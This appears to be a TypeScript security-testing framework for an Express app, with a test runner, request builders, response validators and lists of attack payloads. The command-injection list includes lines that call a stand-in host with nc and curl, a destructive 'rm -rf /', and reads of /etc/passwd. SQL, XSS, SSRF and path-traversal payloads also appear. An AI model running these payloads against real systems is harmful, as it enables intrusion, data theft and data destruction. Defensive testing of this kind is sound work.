import { Request, Response } from 'express';
import type { Application } from 'express';
import request from 'supertest';

/**
 * Security Test Framework
 * 
 * Provides utilities and helpers for security testing including:
 * - Test result structure
 * - Attack payload generators
 * - Authentication helpers
 * - Request builders
 * - Response validators
 */

export type SecurityTestSeverity = 'critical' | 'high' | 'medium' | 'low';

export interface SecurityTestResult {
  passed: boolean;
  severity: SecurityTestSeverity;
  message: string;
  details?: Record<string, unknown>;
  remediation?: string;
}

export interface SecurityTest {
  category: string; // OWASP Top 10 category
  name: string;
  description: string;
  testFunction: () => Promise<SecurityTestResult>;
  severity: SecurityTestSeverity;
}

/**
 * Base Security Test Framework Class
 */
export class SecurityTestFramework {
  private app: Application;
  private results: SecurityTestResult[] = [];

  constructor(app: Application) {
    this.app = app;
  }

  /**
   * Execute a security test
   */
  async executeTest(test: SecurityTest): Promise<SecurityTestResult> {
    try {
      const result = await test.testFunction();
      this.results.push(result);
      return result;
    } catch (error: any) {
      const result: SecurityTestResult = {
        passed: false,
        severity: test.severity,
        message: `Test execution failed: ${error?.message || 'Unknown error'}`,
        details: { error: error?.stack },
        remediation: 'Review test implementation and fix errors',
      };
      this.results.push(result);
      return result;
    }
  }

  /**
   * Execute multiple security tests
   */
  async executeTests(tests: SecurityTest[]): Promise<SecurityTestResult[]> {
    const results: SecurityTestResult[] = [];
    for (const test of tests) {
      const result = await this.executeTest(test);
      results.push(result);
    }
    return results;
  }

  /**
   * Get test results summary
   */
  getResultsSummary(): {
    total: number;
    passed: number;
    failed: number;
    bySeverity: Record<SecurityTestSeverity, number>;
  } {
    const summary = {
      total: this.results.length,
      passed: this.results.filter((r) => r.passed).length,
      failed: this.results.filter((r) => !r.passed).length,
      bySeverity: {
        critical: 0,
        high: 0,
        medium: 0,
        low: 0,
      } as Record<SecurityTestSeverity, number>,
    };

    for (const result of this.results) {
      summary.bySeverity[result.severity]++;
    }

    return summary;
  }

  /**
   * Get all test results
   */
  getResults(): SecurityTestResult[] {
    return this.results;
  }

  /**
   * Clear test results
   */
  clearResults(): void {
    this.results = [];
  }
}

/**
 * Attack Payload Generators
 */
export class AttackPayloadGenerator {
  /**
   * Generate SQL injection payloads
   */
  static getSQLInjectionPayloads(): string[] {
    return [
      "' OR '1'='1",
      "'; DROP TABLE users--",
      "' UNION SELECT * FROM users--",
      "1' OR '1'='1",
      "admin'--",
      "admin'/*",
      "' OR 1=1--",
      "' OR 'a'='a",
      "') OR ('1'='1",
      "1' AND '1'='1",
      "1' AND '1'='2",
      "1' UNION SELECT NULL--",
      "1' UNION SELECT 1,2,3--",
      "1' UNION SELECT username,password FROM users--",
    ];
  }

  /**
   * Generate XSS payloads
   */
  static getXSSPayloads(): string[] {
    return [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      'javascript:alert("XSS")',
      '<svg onload=alert("XSS")>',
      '<body onload=alert("XSS")>',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      '<input onfocus=alert("XSS") autofocus>',
      '<select onfocus=alert("XSS") autofocus>',
      '<textarea onfocus=alert("XSS") autofocus>',
      '<keygen onfocus=alert("XSS") autofocus>',
      '<video><source onerror="alert(\'XSS\')">',
      '<audio src=x onerror=alert("XSS")>',
      '<details open ontoggle=alert("XSS")>',
      '<marquee onstart=alert("XSS")>',
      '<div onmouseover=alert("XSS")>',
    ];
  }

  /**
   * Generate command injection payloads
   */
  static getCommandInjectionPayloads(): string[] {
    return [
      '; ls -la',
      '| cat /etc/passwd',
      '&& whoami',
      '|| id',
      '`whoami`',
      '$(whoami)',
      '; cat /etc/passwd',
      '| nc attacker.com 4444',
      '; rm -rf /',
      '&& curl attacker.com',
    ];
  }

  /**
   * Generate path traversal payloads
   */
  static getPathTraversalPayloads(): string[] {
    return [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32',
      '/etc/passwd',
      'C:\\Windows\\System32',
      '....//....//etc/passwd',
      '..%2F..%2F..%2Fetc%2Fpasswd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '..%252f..%252f..%252fetc%252fpasswd',
    ];
  }

  /**
   * Generate SSRF payloads
   */
  static getSSRFPayloads(): string[] {
    return [
      'http://localhost:22',
      'http://127.0.0.1:3306',
      'http://[::1]:6379',
      'file:///etc/passwd',
      'gopher://127.0.0.1:6379',
      'dict://127.0.0.1:11211',
      'http://169.254.169.254/latest/meta-data/',
      'http://localhost/admin',
      'http://127.0.0.1:8080',
    ];
  }

  /**
   * Generate NoSQL injection payloads
   */
  static getNoSQLInjectionPayloads(): Record<string, unknown>[] {
    return [
      { $ne: null },
      { $gt: '' },
      { $regex: '.*' },
      { $where: 'this.username == this.password' },
      { $or: [{ username: 'admin' }, { password: 'admin' }] },
      { username: { $ne: null } },
      { password: { $exists: true } },
    ];
  }
}

/**
 * Authentication Helpers
 */
export class AuthHelper {
  /**
   * Create a test user token
   */
  static async createTestToken(
    userId: string,
    organizationId: string,
    role: string = 'user'
  ): Promise<string> {
    // This should use your actual JWT token generation
    // For now, return a placeholder
    return `test-token-${userId}-${organizationId}-${role}`;
  }

  /**
   * Create an expired token
   */
  static async createExpiredToken(
    userId: string,
    organizationId: string
  ): Promise<string> {
    // This should create an expired JWT token
    return `expired-token-${userId}-${organizationId}`;
  }

  /**
   * Create an invalid token
   */
  static createInvalidToken(): string {
    return 'invalid-token-12345';
  }

  /**
   * Create a malformed token
   */
  static createMalformedToken(): string {
    return 'not.a.valid.jwt.token';
  }
}

/**
 * Request Builders
 */
export class RequestBuilder {
  private app: Application;

  constructor(app: Application) {
    this.app = app;
  }

  /**
   * Build a request with SQL injection payload
   */
  sqlInjectionRequest(
    method: 'get' | 'post' | 'put' | 'delete',
    endpoint: string,
    payload: string
  ) {
    const req = request(this.app)[method](endpoint);
    if (method === 'get') {
      return req.query({ input: payload });
    }
    return req.send({ input: payload });
  }

  /**
   * Build a request with XSS payload
   */
  xssRequest(
    method: 'get' | 'post' | 'put' | 'delete',
    endpoint: string,
    payload: string
  ) {
    const req = request(this.app)[method](endpoint);
    if (method === 'get') {
      return req.query({ input: payload });
    }
    return req.send({ input: payload });
  }

  /**
   * Build a request with authentication
   */
  authenticatedRequest(
    method: 'get' | 'post' | 'put' | 'delete',
    endpoint: string,
    token: string
  ) {
    return request(this.app)
      [method](endpoint)
      .set('Authorization', `Bearer ${token}`);
  }

  /**
   * Build a request without authentication
   */
  unauthenticatedRequest(
    method: 'get' | 'post' | 'put' | 'delete',
    endpoint: string
  ) {
    return request(this.app)[method](endpoint);
  }
}

/**
 * Response Validators
 */
export class ResponseValidator {
  /**
   * Validate that response does not contain SQL error messages
   */
  static validateNoSQLErrors(response: request.Response): boolean {
    const body = JSON.stringify(response.body || {});
    const text = response.text || '';
    
    const sqlErrorPatterns = [
      /SQL syntax/i,
      /database error/i,
      /mysql error/i,
      /postgresql error/i,
      /ORA-\d{5}/i, // Oracle errors
      /Microsoft.*ODBC/i,
      /SQLite.*error/i,
      /Warning.*mysql_/i,
      /valid MySQL result/i,
      /MySqlClient\./i,
      /PostgreSQL query failed/i,
      /Warning.*pg_/i,
      /Npgsql\./i,
      /valid PostgreSQL result/i,
    ];

    for (const pattern of sqlErrorPatterns) {
      if (pattern.test(body) || pattern.test(text)) {
        return false;
      }
    }

    return true;
  }

  /**
   * Validate that response does not contain XSS payload
   */
  static validateNoXSS(response: request.Response, payload: string): boolean {
    const body = JSON.stringify(response.body || {});
    const text = response.text || '';
    
    // Check if the payload appears in the response (should be sanitized)
    if (body.includes(payload) || text.includes(payload)) {
      // Check if it's properly escaped
      const escapedPayload = payload
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;');
      
      // If it's escaped, it's safe
      if (body.includes(escapedPayload) || text.includes(escapedPayload)) {
        return true;
      }
      
      // If it's not escaped, it's a vulnerability
      return false;
    }

    return true;
  }

  /**
   * Validate that response has proper security headers
   */
  static validateSecurityHeaders(response: request.Response): {
    valid: boolean;
    missing: string[];
  } {
    const requiredHeaders = [
      'X-Content-Type-Options',
      'X-Frame-Options',
      'X-XSS-Protection',
    ];

    const missing: string[] = [];
    for (const header of requiredHeaders) {
      if (!response.headers[header.toLowerCase()]) {
        missing.push(header);
      }
    }

    return {
      valid: missing.length === 0,
      missing,
    };
  }

  /**
   * Validate that response status is appropriate
   */
  static validateStatus(
    response: request.Response,
    expectedStatus: number
  ): boolean {
    return response.status === expectedStatus;
  }

  /**
   * Validate that response does not leak sensitive information
   */
  static validateNoSensitiveDataLeak(response: request.Response): boolean {
    const body = JSON.stringify(response.body || {});
    const text = response.text || '';
    
    const sensitivePatterns = [
      /password/i,
      /secret/i,
      /api[_-]?key/i,
      /token/i,
      /private[_-]?key/i,
      /ssh[_-]?key/i,
      /aws[_-]?access[_-]?key/i,
      /database[_-]?password/i,
    ];

    // Check for sensitive data in error messages
    for (const pattern of sensitivePatterns) {
      if (pattern.test(body) || pattern.test(text)) {
        // Check if it's in an error message context
        if (
          /error|exception|stack|trace/i.test(body) ||
          /error|exception|stack|trace/i.test(text)
        ) {
          return false;
        }
      }
    }

    return true;
  }
}

/**
 * Test Data Generators
 */
export class TestDataGenerator {
  /**
   * Generate random string
   */
  static randomString(length: number = 10): string {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  }

  /**
   * Generate random email
   */
  static randomEmail(): string {
    return `test-${this.randomString(8)}@example.com`;
  }

  /**
   * Generate random UUID
   */
  static randomUUID(): string {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, (c) => {
      const r = (Math.random() * 16) | 0;
      const v = c === 'x' ? r : (r & 0x3) | 0x8;
      return v.toString(16);
    });
  }
}

